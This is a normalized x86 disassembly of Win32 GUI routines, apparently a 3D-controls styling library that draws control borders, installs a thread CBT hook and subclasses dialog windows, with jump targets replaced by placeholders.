mov [ esp + 0x18 ] eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
mov ax [ esp + 0x30 ]
cmp [ esp + 0x2c ] ax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
mov eax [ ebx + 0x8 ]
mov [ esp + 0x18 ] eax
dec eax
test bp 0x4
mov [ esp + 0x10 ] eax
je r-xdata
movzx eax ax
mov ecx [ eax * 4 + rw-data ]
push ecx
push edi
call [ SetBkColor@IAT ]
test bp 0x8
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
push esi
push edi
call [ SetBkColor@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov eax [ ebx ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x1c ]
dec eax
test bp 0x1000
mov [ esp + 0x14 ] eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
sub [ esp + 0x18 ] 0x2
sub_416d70
mov ecx [ esp + 0x8 ]
sub esp 0x10
lea edx [ esp ]
push esi
push edi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
mov edi [ ecx + 0x8 ]
mov [ edx ] eax
mov eax [ ecx + 0xc ]
mov [ edx + 0x4 ] esi
mov [ edx + 0x8 ] edi
mov di [ esp + 0x24 ]
mov [ edx + 0xc ] eax
mov ax di
lea edx [ esp + 0x8 ]
and ax 0xf
mov esi [ esp + 0x1c ]
push eax
push 0x1
push 0x7
push edx
push esi
call sub_416c30
dec [ esp + 0x1c ]
dec [ esp + 0x20 ]
lea ecx [ esp + 0x1c ]
inc [ esp + 0x24 ]
inc [ esp + 0x28 ]
add esp 0x14
push edi
push 0x0
push 0x2
push ecx
push esi
call sub_416c30
add esp 0x14
pop edi
pop esi
add esp 0x10
retn
sub_416de0
mov ecx [ esp + 0x4 ]
sub esp 0x10
lea eax [ esp ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push ecx
mov ecx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x20 ]
push eax
push ecx
push edx
call [ IntersectClipRect@IAT ]
add esp 0x10
retn
sub_416e20
mov eax [ esp + 0x8 ]
sub esp 0x108
push ebx
cmp [ eax ] 0x0
push esi
push edi
lea esi [ esp + 0x14 ]
je r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x14 ]
push eax
mov [ esi ] 0x0
push ecx
call [ lstrlenA@IAT ]
lea ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x120 ]
push ecx
push eax
call [ GetTextExtentPointA@IAT ]
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x120 ]
mov edx [ esp + 0x10 ]
mov [ eax ] ecx
mov ecx [ esp + 0x124 ]
pop edi
pop esi
pop ebx
mov [ ecx ] edx
add esp 0x108
retn
mov edi [ CharNextA@IAT ]
xor ebx ebx
cmp [ rw-data ] bl
je r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
mov cl [ eax ]
inc eax
mov [ esi ] cl
inc esi
cmp cl [ rw-data ]
jne r-xdata
jmp r-xdata
mov cl [ eax ]
cmp cl 0x26
jne r-xdata
cmp cl 0x1e
je r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
inc eax
cmp [ eax ] bl
je r-xdata
cmp cl 0x1f
jne r-xdata
jmp r-xdata
push eax
call edi
jmp r-xdata
cmp [ eax ] bl
jne r-xdata
sub_416ed0
push esi
push rw-data
call [ InitializeCriticalSection@IAT ]
push rw-data
call [ EnterCriticalSection@IAT ]
push rw-data
inc [ rw-data ]
call [ LeaveCriticalSection@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
mov esi [ esp + 0x8 ]
mov esi [ esp + 0x8 ]
push 0x0
push 0x1
push esi
call sub_419dd0
add esp 0xc
call sub_4179a0
jmp r-xdata
mov eax [ rw-data ]
pop esi
retn 0x4
push esi
call sub_417000
call sub_417150
test eax eax
je r-xdata
sub_416f40
push ebx
push esi
push edi
push ebp
xor ebp ebp
call [ GetCurrentThreadId@IAT ]
mov ebx eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] ebp
jle r-xdata
push rw-data
dec [ rw-data ]
call [ LeaveCriticalSection@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp * 4 ]
cmp [ eax + eax * 4 + rw-data ] ebx
lea esi [ eax + eax * 4 ]
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
call sub_417b90
inc ebp
cmp ebp [ rw-data ]
jl r-xdata
mov eax [ esi + rw-data ]
dec eax
mov [ esi + rw-data ] eax
je r-xdata
mov eax [ esi + rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
dec [ rw-data ]
cmp ebp [ rw-data ]
jge r-xdata
mov eax [ esp + 0x14 ]
cmp [ esi + rw-data ] eax
jne r-xdata
lea edi [ esi + rw-data ]
lea eax [ edi + 0x14 ]
mov ecx 0x5
mov esi eax
inc ebp
[ edi ] [ esi ]
mov edi eax
cmp ebp [ rw-data ]
jl r-xdata
sub_417010
cmp [ rw-data ] 0x30a
push esi
push edi
jae r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edi
pop esi
retn 0x8
mov esi [ esp + 0x10 ]
or esi 0x1
test esi 0x2
je r-xdata
xor eax eax
pop edi
pop esi
retn 0x8
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] 0x80
je r-xdata
and esi 0xfffffffc
push rw-data
call [ LeaveCriticalSection@IAT ]
xor eax eax
pop edi
pop esi
retn 0x8
call [ GetCurrentThreadId@IAT ]
mov edi eax
xor eax eax
cmp [ rw-data ] eax
jle r-xdata
push edi
mov eax [ rw-data ]
push eax
push sub_418170
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
je r-xdata
mov ecx rw-data
mov edx [ rw-data ]
mov ecx [ esp + 0xc ]
shl edx 0x2
mov [ edx + edx * 4 + rw-data ] ecx
mov ecx [ rw-data ]
shl ecx 0x2
mov [ ecx + ecx * 4 + rw-data ] edi
mov ecx [ rw-data ]
shl ecx 0x2
mov [ ecx + ecx * 4 + rw-data ] eax
mov eax [ rw-data ]
shl eax 0x2
mov [ eax + eax * 4 + rw-data ] 0x1
mov eax [ rw-data ]
shl eax 0x2
mov [ eax + eax * 4 + rw-data ] esi
mov ecx [ rw-data ]
mov [ rw-data ] edi
mov [ rw-data ] ecx
inc [ rw-data ]
shl eax 0x2
inc [ eax + eax * 4 + rw-data ]
jmp r-xdata
add ecx 0x14
inc eax
cmp eax [ rw-data ]
jl r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
pop edi
pop esi
retn 0x8
cmp [ ecx ] edi
je r-xdata
sub_417150
call [ GetCurrentThreadId@IAT ]
xor edx edx
cmp [ rw-data ] edx
jle r-xdata
xor eax eax
retn
mov ecx rw-data
mov eax 0x1
retn
add ecx 0x14
inc edx
cmp edx [ rw-data ]
jl r-xdata
cmp [ ecx ] eax
je r-xdata
sub_417180
push ebx
push esi
push edi
push ebp
xor ebp ebp
call [ GetCurrentThreadId@IAT ]
mov ebx eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] ebp
jle r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp * 4 ]
cmp [ eax + eax * 4 + rw-data ] ebx
lea esi [ eax + eax * 4 ]
jne r-xdata
inc ebp
cmp ebp [ rw-data ]
jl r-xdata
mov eax [ esi + rw-data ]
dec eax
mov [ esi + rw-data ] eax
jne r-xdata
mov eax [ esi + rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
dec [ rw-data ]
cmp ebp [ rw-data ]
jge r-xdata
lea edi [ esi + rw-data ]
lea eax [ edi + 0x14 ]
mov ecx 0x5
mov esi eax
inc ebp
[ edi ] [ esi ]
mov edi eax
cmp ebp [ rw-data ]
jl r-xdata
sub_417250
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov esi [ esp + 0x14 ]
push 0xfffffffc
push esi
call [ GetWindowLongA@IAT ]
xor ecx ecx
mov edi [ SetWindowLongA@IAT ]
mov ebx [ RemovePropA@IAT ]
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
inc ecx
cmp ecx 0x6
jl r-xdata
push ecx
push esi
call sub_416920
add esp 0x8
mov ebp eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
push ebp
push 0xfffffffc
push esi
call edi
xor eax eax
mov ecx 0x10
lea edx [ ecx + ecx * 2 ]
cmp [ edx * 8 + rw-data ] eax
jne r-xdata
jne r-xdata
push 0x5
push esi
mov esi [ GetWindow@IAT ]
call esi
mov edi eax
test edi edi
je r-xdata
cmp eax sub_417e00
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
push edi
call sub_417250
push 0x2
push edi
call esi
mov edi eax
test edi edi
jne r-xdata
xor eax eax
mov edi [ GetPropA@IAT ]
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
push ecx
push esi
call sub_416920
add esp 0x8
mov ebp eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
push ebp
push 0xfffffffc
push esi
call edi
jmp r-xdata
push 0x1
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
je r-xdata
sub_417360
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov edi [ esp + 0x14 ]
test edi edi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
cmp edi 0x6
jg r-xdata
mov esi [ esp + 0x10 ]
push esi
call sub_416900
add esp 0x4
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov ebx eax
push esi
call [ GetParent@IAT ]
push eax
push 0x0
push 0xffff
mov eax edi
shl eax 0x5
push ebx
push esi
call [ eax + r--data ]
add esp 0x14
cmp eax 0x1
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
retn 0x8
mov eax 0x1
pop edi
pop esi
pop ebx
retn 0x8
lea eax [ edi + edi * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_416970
add esp 0x8
sub_4173f0
sub esp 0x4
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
push esi
call sub_416900
add esp 0x4
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push eax
push 0x0
push ecx
push esi
call sub_418500
add esp 0x10
pop edi
pop esi
pop ebx
add esp 0x4
retn
pop edi
pop esi
pop ebx
add esp 0x4
retn
lea ebx [ esp + 0xc ]
mov edi [ SendMessageA@IAT ]
mov [ esp + 0xc ] 0x29a
push ebx
push 0x0
push 0x1944
push esi
call edi
cmp [ esp + 0xc ] 0x29a
jne r-xdata
push ebx
push 0x0
push 0x1943
push esi
call edi
cmp [ esp + 0xc ] 0x29a
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ RemovePropA@IAT ]
mov ax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
push ecx
push 0x0
push eax
push esi
call sub_418500
add esp 0x10
sub_4174a0
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov eax [ esp + 0x14 ]
push 0x5
push eax
mov ebp [ GetWindow@IAT ]
call ebp
mov edi eax
test edi edi
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov si [ esp + 0x18 ]
push 0x2
push edi
call ebp
mov edi eax
test edi edi
jne r-xdata
push edi
push esi
push ebx
call sub_4173f0
add esp 0xc
push 0x2
push ebx
call ebp
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push esi
push edi
call sub_4173f0
add esp 0xc
push 0x5
push edi
call ebp
mov ebx eax
test ebx ebx
je r-xdata
sub_417520
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
push ebp
jne r-xdata
mov edi [ esp + 0x14 ]
push 0x5
push edi
mov esi [ GetWindow@IAT ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
push sub_417e00
push edi
call sub_416970
add esp 0x8
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x8
mov bp [ esp + 0x18 ]
push 0x0
push 0x0
push ebp
push ebx
call sub_418500
add esp 0x10
push 0x2
push ebx
call esi
mov ebx eax
test ebx ebx
jne r-xdata
sub_417590
cmp [ rw-data ] 0x0
push esi
je r-xdata
xor eax eax
pop esi
retn 0xc
mov eax [ esp + 0x8 ]
cmp eax 0x134
jb r-xdata
cmp eax 0x137
je r-xdata
cmp eax 0x134
jne r-xdata
mov esi [ esp + 0xc ]
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov ecx [ rw-data ]
push ecx
push esi
call [ SetBkColor@IAT ]
mov eax [ rw-data ]
pop esi
retn 0xc
cmp [ rw-data ] 0x35f
jae r-xdata
xor eax eax
pop esi
retn 0xc
mov esi [ esp + 0x10 ]
push 0x5
push esi
call [ GetWindow@IAT ]
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
and al 0x3
cmp al 0x3
jne r-xdata
sub_417650
sub esp 0x3c
cmp [ esp + 0x50 ] 0x0
push ebx
push esi
push edi
push ebp
je r-xdata
mov esi [ esp + 0x50 ]
push 0x6
push esi
call sub_416920
add esp 0x8
xor eax eax
mov esi [ esp + 0x50 ]
jmp r-xdata
mov eax [ esp + 0x5c ]
mov edx [ esp + 0x58 ]
push eax
push edx
push esi
call [ DefWindowProcA@IAT ]
mov edx [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push edx
push ebx
push esi
push eax
call [ CallWindowProcA@IAT ]
jmp r-xdata
mov ecx [ esp + 0x5c ]
test eax eax
push ecx
je r-xdata
push esi
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
cmp [ rw-data ] 0x0
mov [ esp + 0x10 ] eax
jne r-xdata
mov [ esp + 0x14 ] 0x1
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x11ef
push esi
call [ SendMessageA@IAT ]
push 0xfffffff0
mov ebp [ GetWindowLongA@IAT ]
push esi
call ebp
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x3c
retn 0x14
mov ecx eax
and ecx 0x10400080
cmp ecx 0x10400080
jne r-xdata
and eax 0xc00000
mov ebx [ rw-data ]
sub eax 0xc00000
cmp eax 0x1
push esi
sbb ebp ebp
neg ebp
cmp ebp 0x1
sbb eax eax
inc eax
sub ebx eax
call [ GetWindowDC@IAT ]
mov edi eax
lea eax [ esp + 0x1c ]
push eax
push esi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
sub [ esp + 0x24 ] ecx
push 0xf
lea eax [ esp + 0x20 ]
push 0x7
sub [ esp + 0x30 ] edx
push 0x2
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x28 ] 0x0
push eax
push edi
call sub_416c30
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
lea ecx [ esp + 0x1c ]
push 0xf
push 0x2
push 0x0
push ecx
push edi
call sub_416c30
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
mov ecx [ rw-data ]
push ecx
push edi
call [ SelectObject@IAT ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x1c ]
mov edx [ eax ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
push ecx
push edi
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] eax
mov eax [ esp + 0x24 ]
add eax [ rw-data ]
mov [ esp + 0x3c ] eax
call sub_416c00
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
sub eax [ esp + 0x24 ]
add esp 0x8
sub eax [ rw-data ]
push 0x0
push eax
push ecx
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x2c ]
push ecx
push edi
call sub_416c00
mov eax [ esp + 0x24 ]
add esp 0x8
add eax [ rw-data ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x24 ]
sub eax [ rw-data ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x34 ] eax
push ecx
mov eax [ esp + 0x34 ]
push edi
add eax ebx
mov [ esp + 0x40 ] eax
call sub_416c00
add esp 0x8
test ebp ebp
je r-xdata
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x2c ]
sub eax [ esp + 0x20 ]
push ecx
sub eax [ rw-data ]
push edi
add [ esp + 0x38 ] eax
mov eax [ esp + 0x38 ]
add eax [ rw-data ]
mov [ esp + 0x40 ] eax
call sub_416c00
mov ecx [ esp + 0x20 ]
add esp 0x8
push ecx
push edi
call [ SelectObject@IAT ]
push edi
push esi
call [ ReleaseDC@IAT ]
mov ebp [ esp + 0x30 ]
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x3c ]
mov eax [ edx ]
add ebx [ esp + 0x30 ]
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
mov [ ecx + 0x4 ] ebp
mov edx [ edx + 0xc ]
mov [ ecx + 0x8 ] eax
mov eax [ rw-data ]
push 0xf
add eax ebx
push 0x0
push 0x2
mov [ ecx + 0xc ] edx
lea ecx [ esp + 0x48 ]
mov [ esp + 0x4c ] ebx
mov [ esp + 0x54 ] eax
push ecx
push edi
call sub_416c30
add esp 0x14
sub_417900
sub esp 0xc
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
pop edi
pop esi
add esp 0xc
retn
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x8 ]
push 0x9
push eax
mov esi [ GetProfileStringA@IAT ]
mov [ rw-data ] 0x1e
push rw-data
push rw-data
push rw-data
call esi
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
mov edi [ lstrcmpiA@IAT ]
call edi
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push 0x9
push eax
push rw-data
push rw-data
push rw-data
call esi
lea eax [ esp + 0x8 ]
push rw-data
push eax
call edi
test eax eax
jne r-xdata
mov [ rw-data ] 0x1f
push rw-data
call [ LeaveCriticalSection@IAT ]
mov [ rw-data ] 0x1f
sub_4179a0
sub esp 0x28
push ebx
push esi
push edi
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x0
call [ GetDC@IAT ]
mov ebx eax
push 0xc
push ebx
mov esi [ GetDeviceCaps@IAT ]
call esi
mov edi eax
push 0xe
push ebx
call esi
imul edi eax
mov eax 0x1
cmp edi 0x4
jge r-xdata
push 0x1
mov edi [ GetSystemMetrics@IAT ]
mov [ rw-data ] eax
call edi
cmp eax 0x15e
jne r-xdata
xor eax eax
push ebx
push 0x0
call [ ReleaseDC@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
call edi
cmp eax 0x280
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax [ rw-data ]
pop edi
pop esi
pop ebx
add esp 0x28
retn
push rw-data
mov esi [ GlobalAddAtomA@IAT ]
call esi
mov [ rw-data ] ax
test ax ax
jne r-xdata
mov [ rw-data ] 0x0
push rw-data
call esi
mov [ rw-data ] ax
test ax ax
je r-xdata
mov [ rw-data ] 0x0
push rw-data
call esi
mov [ rw-data ] ax
push rw-data
call esi
cmp [ rw-data ] 0x0
mov [ rw-data ] ax
je r-xdata
xor eax eax
pop edi
mov [ rw-data ] 0x0
pop esi
pop ebx
add esp 0x28
retn
test ax ax
je r-xdata
push rw-data
call esi
mov [ rw-data ] ax
push rw-data
call esi
cmp [ rw-data ] 0x0
mov [ rw-data ] ax
je r-xdata
xor eax eax
pop edi
mov [ rw-data ] 0x0
pop esi
pop ebx
add esp 0x28
retn
test ax ax
je r-xdata
push rw-data
call esi
mov [ rw-data ] ax
test ax ax
je r-xdata
push 0x2a
call edi
mov [ rw-data ] al
call sub_417900
push 0x1
call sub_417c70
add esp 0x4
test eax eax
je r-xdata
mov ebx rw-data
mov esi r--data
mov edi [ GetClassInfoA@IAT ]
mov eax [ esi ]
lea edx [ esi - 0x14 ]
mov [ ebx ] eax
lea ecx [ esp + 0xc ]
push ecx
add ebx 0x18
push edx
add esi 0x20
push 0x0
call edi
mov ecx [ esp + 0x10 ]
cmp esi r--data
mov [ ebx - 0x14 ] ecx
jb r-xdata
lea eax [ esp + 0xc ]
push eax
push 0x8002
push 0x0
call edi
test eax eax
je r-xdata
mov eax [ DefDlgProcA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
jmp r-xdata
sub_417b90
push esi
push rw-data
call [ EnterCriticalSection@IAT ]
mov eax rw-data
add eax 0x18
cmp eax rw-data
jb r-xdata
mov [ eax ] 0x0
cmp [ eax ] 0x0
je r-xdata
call sub_416bd0
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ GlobalDeleteAtom@IAT ]
mov ax [ rw-data ]
mov esi [ GlobalDeleteAtom@IAT ]
push eax
call esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ rw-data ]
push eax
call esi
mov [ rw-data ] 0x0
push rw-data
call [ LeaveCriticalSection@IAT ]
pop esi
retn
mov ax [ rw-data ]
push eax
call esi
sub_417c70
sub esp 0x30
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor si si
mov ebx [ GetSysColor@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x30
retn
movzx edi si
inc si
xor eax eax
mov ax [ edi * 2 + r--data ]
push eax
call ebx
cmp si 0x8
mov [ esp + edi * 4 + 0x1c ] eax
jb r-xdata
cmp [ rw-data ] 0x300
jne r-xdata
cmp [ esp + 0x34 ] 0x0
je r-xdata
mov [ esp + 0x1c ] 0xffffff
cmp [ esp + 0x20 ] 0x808080
mov [ esp + 0x34 ] 0xc0c0c0
je r-xdata
mov eax [ esp + 0x34 ]
cmp [ esp + 0x20 ] eax
jne r-xdata
cmp [ esp + 0x40 ] 0x0
jne r-xdata
mov [ esp + 0x34 ] 0x808080
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x3c ]
push eax
push ecx
mov eax [ rw-data ]
xor si si
push edx
push 0x67c7
push eax
call sub_419ea0
mov edi [ CreateSolidBrush@IAT ]
mov [ esp + 0xc ] eax
mov esi rw-data
lea edi [ esp + 0x1c ]
mov ecx 0x20
[ esi ] [ edi ]
jne r-xdata
movzx eax si
inc si
mov ecx [ esp + eax * 4 + 0x1c ]
lea ebx [ eax * 4 ]
push ecx
call edi
cmp si 0x3
mov [ esp + ebx + 0x10 ] eax
jb r-xdata
xor eax eax
xor ecx ecx
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x30
retn
xor si si
inc ax
cmp ax 0x3
jb r-xdata
movzx eax si
inc si
lea ecx [ esp + eax * 4 + 0x10 ]
push ecx
call sub_416bb0
add esp 0x4
cmp si 0x3
jb r-xdata
lea eax [ esp + 0xc ]
push eax
call sub_416bb0
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x30
retn
movzx edx ax
cmp [ esp + edx * 4 + 0x10 ] ecx
je r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
call sub_416bd0
mov ebx [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
mov edx rw-data
lea esi [ esp + 0x1c ]
mov eax [ ecx ]
mov edi rw-data
mov ecx [ ecx + 0x8 ]
mov [ edx ] eax
mov [ edx + 0x4 ] ebx
mov [ edx + 0x8 ] ecx
mov ecx 0x8
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop edi
pop esi
mov [ rw-data ] eax
mov eax 0x1
pop ebx
add esp 0x30
retn
sub_417e00
sub esp 0x18
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x30 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x2c ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov ebp [ esp + 0x38 ]
push 0x6
mov ebx [ esp + 0x38 ]
push ebp
mov esi [ esp + 0x34 ]
push ebx
push edi
push esi
call sub_416b50
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp edi 0x86
ja r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp edi 0x138
ja r-xdata
cmp edi 0x85
jae r-xdata
cmp edi 0x1943
jb r-xdata
cmp edi 0x132
jae r-xdata
cmp [ rw-data ] 0x35f
jae r-xdata
cmp edi 0xc
je r-xdata
mov ebx [ esp + 0x34 ]
mov ebp [ esp + 0x38 ]
cmp edi 0x1944
jbe r-xdata
lea eax [ esp + 0x18 ]
push 0x10
push eax
push esi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
cmp edi 0x110
je r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
push esi
call [ IsIconic@IAT ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x38 ]
mov eax 0x3ee
mov [ ebp ] 0x1
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
jmp r-xdata
push 0x4
push esi
call [ GetWindowLongA@IAT ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
lea eax [ edi + 0xcbf ]
push ebx
push eax
push esi
push 0x6
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
push 0x6
push esi
call sub_416920
mov [ esp + 0x1c ] eax
add esp 0x8
cmp [ rw-data ] 0x35f
jb r-xdata
jmp r-xdata
mov ebp [ esp + 0x38 ]
push 0x0
mov ebx [ esp + 0x38 ]
push ebp
push ebx
push edi
push esi
call sub_417650
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
cmp eax 0xffff0000
jbe r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
jmp r-xdata
push ebp
cmp eax 0x1
jne r-xdata
mov [ esp + 0x10 ] 0x1
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] 0x0
test al 0x4
jne r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x30a
ja r-xdata
push ebx
push edi
call sub_417590
push ebp
push ebx
push edi
push esi
push 0x6
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
pop ebp
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
test eax eax
je r-xdata
jmp r-xdata
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
push ebp
push ebx
push edi
push esi
push eax
call [ CallWindowProcA@IAT ]
cmp [ rw-data ] 0x35f
mov edi eax
jb r-xdata
push esi
call sub_417250
mov ebp [ esp + 0x38 ]
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
